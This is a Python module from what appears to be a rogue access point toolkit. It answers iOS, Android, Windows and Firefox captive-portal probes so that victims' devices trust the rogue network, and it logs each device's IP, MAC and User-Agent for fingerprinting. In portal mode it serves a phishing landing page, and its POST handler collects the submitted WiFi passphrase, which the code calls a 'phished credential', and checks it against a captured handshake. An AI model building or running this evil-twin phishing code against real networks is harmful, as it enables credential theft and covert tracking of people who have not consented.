"""Captive-portal probe listener — answers iOS/Android/Windows sentinels.

Every modern OS, the moment it gets a DHCP lease on a new network,
issues an HTTP probe to a well-known endpoint to decide whether the
network actually provides Internet. If the probe succeeds with the
expected response, the OS marks the network as "real internet" and
starts routing app traffic over it; if the probe times out or returns
the wrong body, the OS shows "Connected, no Internet" and keeps
cellular as primary.

For PineAP's open-AP path we want the probe to succeed — that's what
makes the victim's phone treat our rogue as a usable network so we
can observe the resulting traffic. The listener binds to the rogue
gateway IP (``10.0.0.1:80``), answers the known sentinel paths with
the exact expected responses, and 404s everything else for now.

What we get out of running this (the real S11 deliverable):

* Per-request log: source IP (which we resolve to MAC via the dnsmasq
  lease file), path, User-Agent header. The UA pins down the exact OS
  version and browser engine — better fingerprint than DHCP option 55
  on its own.
* Persisted to ``$DATA_DIR/pineap_probes.json`` so the audit trail
  outlives lease expiry.

S17 (MITM) will extend this to optionally *fail* the probe (return
the wrong body) to influence whether the OS treats the network as
"real internet" — useful for forcing the OS into captive-portal mode
where the system browser will pop up the rogue's landing page.
"""

from __future__ import annotations

import json
import logging
import os
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Any

log = logging.getLogger(__name__)


# Sentinel paths + responses, sourced from each OS's documented
# captive-portal behavior. These are the responses each OS *expects*
# in the success case — wrong body means "captive portal in front of
# us" (which we don't want for S11; we want the phone to think the
# network is healthy).
_APPLE_SUCCESS = (
    "<HTML><HEAD><TITLE>Success</TITLE></HEAD>"
    "<BODY>Success</BODY></HTML>"
)
_MS_SUCCESS = "Microsoft Connect Test"

# Maps lowercased path → (status, content-type, body, label).
# Each entry's label appears in the per-request log so the operator
# can see "ah, an iOS device probed".
_SENTINELS: dict[str, tuple[int, str, bytes, str]] = {
    # Apple — iOS, macOS, tvOS
    "/hotspot-detect.html": (200, "text/html", _APPLE_SUCCESS.encode(), "apple"),
    "/library/test/success.html": (200, "text/html", _APPLE_SUCCESS.encode(), "apple"),
    # Android (Google) — older endpoints + current
    "/generate_204":        (204, "text/plain", b"", "android"),
    "/gen_204":             (204, "text/plain", b"", "android"),
    # Microsoft — Windows 8+
    "/connecttest.txt":     (200, "text/plain", _MS_SUCCESS.encode(), "windows"),
    "/ncsi.txt":            (200, "text/plain", _MS_SUCCESS.encode(), "windows"),
    # Firefox / general
    "/canonical.html":      (200, "text/html", b"<html><body>success</body></html>", "firefox"),
    "/success.txt":         (200, "text/plain", b"success", "firefox"),
}


class CaptiveSentinelService:
    """Manages the HTTP listener's lifecycle + the per-request log."""

    def __init__(self, data_dir: Path) -> None:
        self._data_dir = data_dir
        self._log_path = data_dir / "pineap_probes.json"
        self._lock = threading.Lock()
        self._server: ThreadingHTTPServer | None = None
        self._thread: threading.Thread | None = None
        # In-memory ring of recent probes (UI queries this for live view);
        # also persisted to disk so the audit trail survives restart.
        self._recent: list[dict[str, Any]] = self._load_persisted()
        # Bound address — overridden by start() based on stub flag
        self._bound: tuple[str, int] | None = None
        # Portal / "lie" mode (S12.5). When on, the listener stops
        # answering OS probes truthfully and instead serves the captive-
        # portal landing page so the victim's OS pops its captive browser.
        # ``_portal`` is the CaptivePortalService instance (passed in so
        # the request handler — which runs outside any Flask app context —
        # doesn't need current_app).
        self._portal_mode = False
        self._portal: Any = None

    # ---------- Persistence ----------
    def _load_persisted(self) -> list[dict[str, Any]]:
        try:
            data = json.loads(self._log_path.read_text())
            return list(data.get("probes") or [])
        except (FileNotFoundError, json.JSONDecodeError):
            return []

    def _persist(self) -> None:
        # Caller holds self._lock.
        self._log_path.parent.mkdir(parents=True, exist_ok=True)
        tmp = self._log_path.with_suffix(".tmp")
        tmp.write_text(json.dumps({"probes": self._recent}, indent=2))
        tmp.replace(self._log_path)

    # ---------- Public ----------
    def start(self, bind_host: str = "10.0.0.1", bind_port: int = 80,
              *, stub: bool = False) -> tuple[bool, str]:
        """Bind + serve in a daemon thread. ``stub=True`` (Mac dev)
        binds 127.0.0.1:8081 instead so we don't need root + port 80.
        Idempotent — second call returns ok with a message."""
        with self._lock:
            if self._server is not None:
                return True, f"already running on {self._bound[0]}:{self._bound[1]}"
            host, port = ("127.0.0.1", 8081) if stub else (bind_host, bind_port)
            try:
                # Closure: HTTPServer's RequestHandlerClass instantiation
                # gives each request its own handler instance. We pin
                # ``self`` via a tiny subclass so handlers can append to
                # our log without globals.
                svc = self

                class _Handler(_SentinelHandler):
                    sentinel_service = svc

                server = ThreadingHTTPServer((host, port), _Handler)
            except OSError as e:
                return False, f"bind {host}:{port} failed: {e}"
            self._server = server
            self._bound = (host, port)
            t = threading.Thread(
                target=server.serve_forever,
                name=f"captive-sentinel-{port}",
                daemon=True,
            )
            self._thread = t
            t.start()
        log.info("captive sentinel listening on %s:%d", host, port)
        return True, f"listening on {host}:{port}"

    def stop(self) -> tuple[bool, str]:
        with self._lock:
            if self._server is None:
                return True, "already stopped"
            srv = self._server
            self._server = None
            self._bound = None
        try:
            srv.shutdown()       # stops serve_forever
            srv.server_close()
        except Exception:
            log.exception("captive sentinel shutdown failed")
        return True, "stopped"

    def set_portal_mode(self, on: bool, *, portal: Any = None) -> None:
        """Switch the listener between truthful sentinel (S11) and portal
        mode (S12.5). ``portal`` is the CaptivePortalService instance the
        handler uses to render the page + verify submitted PSKs — passed
        explicitly so the handler threads don't need a Flask app context."""
        with self._lock:
            self._portal_mode = bool(on)
            if portal is not None:
                self._portal = portal
        log.info("captive sentinel portal mode: %s", "ON" if on else "off")

    def portal_mode(self) -> bool:
        return self._portal_mode

    def is_running(self) -> bool:
        return self._server is not None

    def bound_address(self) -> tuple[str, int] | None:
        return self._bound

    def list_probes(self, *, limit: int = 200) -> list[dict[str, Any]]:
        """Most recent probes, newest first."""
        with self._lock:
            return list(reversed(self._recent[-limit:]))

    def record(self, probe: dict[str, Any]) -> None:
        """Append a probe record + persist. Called by the handler."""
        # Cap in-memory to last 1000 to keep memory bounded; persisted
        # file grows similarly (we trim before writing).
        with self._lock:
            self._recent.append(probe)
            if len(self._recent) > 1000:
                self._recent = self._recent[-1000:]
            try:
                self._persist()
            except Exception:
                log.exception("captive sentinel persist failed")


class _SentinelHandler(BaseHTTPRequestHandler):
    """HTTP request handler. Subclassed at start() time to inject the
    service reference; this base just defines the routing + logging."""
    sentinel_service: CaptiveSentinelService | None = None

    # Silence the default per-request stderr log (we do our own)
    def log_message(self, fmt: str, *args: Any) -> None:  # noqa: D401, A003
        return

    def _resolve_mac(self, ip: str) -> str | None:
        """Look up the MAC for ``ip`` in the dnsmasq lease file. Best-
        effort — returns None if dnsmasq isn't running or the lease
        file isn't where we expect."""
        for candidate in (
            "/var/lib/misc/dnsmasq.leases",
            "/var/lib/dnsmasq/dnsmasq.leases",
            "/tmp/pipineapple-dnsmasq.leases",     # stub mode fallback
        ):
            try:
                with open(candidate) as f:
                    for line in f:
                        # Format: <expiry> <mac> <ip> <hostname> <client_id>
                        parts = line.split()
                        if len(parts) >= 3 and parts[2] == ip:
                            return parts[1].lower()
            except OSError:
                continue
        return None

    # ---------- Portal mode helpers (S12.5) ----------
    def _portal_active(self):
        """Return the CaptivePortalService iff portal mode is on AND the
        portal is armed; else None (fall back to truthful sentinel)."""
        svc = self.sentinel_service
        if not (svc and svc._portal_mode and svc._portal):
            return None
        try:
            return svc._portal if svc._portal.is_portal_active() else None
        except Exception:
            return None

    def _send_html(self, body: str, status: int = 200) -> None:
        data = body.encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self) -> None:  # noqa: N802 (stdlib spec)
        svc = self.sentinel_service
        path_lc = (self.path or "/").lower().split("?", 1)[0]
        match = _SENTINELS.get(path_lc)

        client_ip = self.client_address[0] if self.client_address else ""
        ua = self.headers.get("User-Agent", "")
        mac = self._resolve_mac(client_ip) if svc else None

        # ---- Portal mode: serve the landing page for everything ----
        # Answering an OS probe path with our HTML instead of the expected
        # success token is exactly what makes the OS decide it's behind a
        # captive portal and pop the CNA / sign-in browser, which then
        # loads this same page. So in portal mode every GET returns the
        # landing page.
        portal = self._portal_active()
        if portal is not None:
            if svc:
                svc.record({
                    "ts": time.time(), "client_ip": client_ip,
                    "client_mac": mac, "path": self.path,
                    "user_agent": ua, "matched": True, "label": "portal",
                })
            log.info("captive portal GET %s %s ua=%r", client_ip, self.path, ua[:60])
            self._send_html(portal.get_portal_html())
            return

        probe = {
            "ts":         time.time(),
            "client_ip":  client_ip,
            "client_mac": mac,
            "path":       self.path,
            "user_agent": ua,
            "matched":    bool(match),
            "label":      (match[3] if match else None),
        }
        if svc:
            svc.record(probe)
        log.info(
            "captive probe %s %s ua=%r %s",
            client_ip, self.path, ua[:60],
            f"matched={match[3]}" if match else "no-match",
        )

        if match:
            status, ctype, body, _label = match
            self.send_response(status)
            self.send_header("Content-Type", ctype)
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            if body:
                self.wfile.write(body)
        else:
            self.send_response(404)
            self.send_header("Content-Length", "0")
            self.end_headers()

    def do_POST(self) -> None:  # noqa: N802 (stdlib spec)
        """Handle the phished-credential submit. Only meaningful in portal
        mode; otherwise 404. Parses the urlencoded ``psk`` field, hands it
        to the captive-portal service (which verifies it against the
        captured handshake), and renders the response the verify mode
        dictates (success page, or the form again with an error)."""
        from urllib.parse import parse_qs

        portal = self._portal_active()
        if portal is None:
            self.send_response(404)
            self.send_header("Content-Length", "0")
            self.end_headers()
            return

        client_ip = self.client_address[0] if self.client_address else ""
        mac = self._resolve_mac(client_ip)
        try:
            length = int(self.headers.get("Content-Length", "0"))
        except (TypeError, ValueError):
            length = 0
        raw = self.rfile.read(length) if length > 0 else b""
        fields = parse_qs(raw.decode("utf-8", errors="replace"))
        psk = (fields.get("psk") or [""])[0]

        result = portal.submit_credential(
            psk, client_ip=client_ip, client_mac=mac)
        log.info("captive portal POST %s psk-len=%d verified=%s mode-msg=%s",
                 client_ip, len(psk), result.get("verified"), result.get("message"))

        if result.get("message") == "success":
            self._send_html(portal.success_html())
        else:
            # retry — re-show the landing page with the error banner
            self._send_html(portal.get_portal_html(error=True))


# ---------- Module singleton ----------

_service: "CaptiveSentinelService | None" = None


def get_service() -> CaptiveSentinelService:
    global _service
    if _service is None:
        from flask import current_app
        _service = CaptiveSentinelService(current_app.config["DATA_DIR"])
    return _service
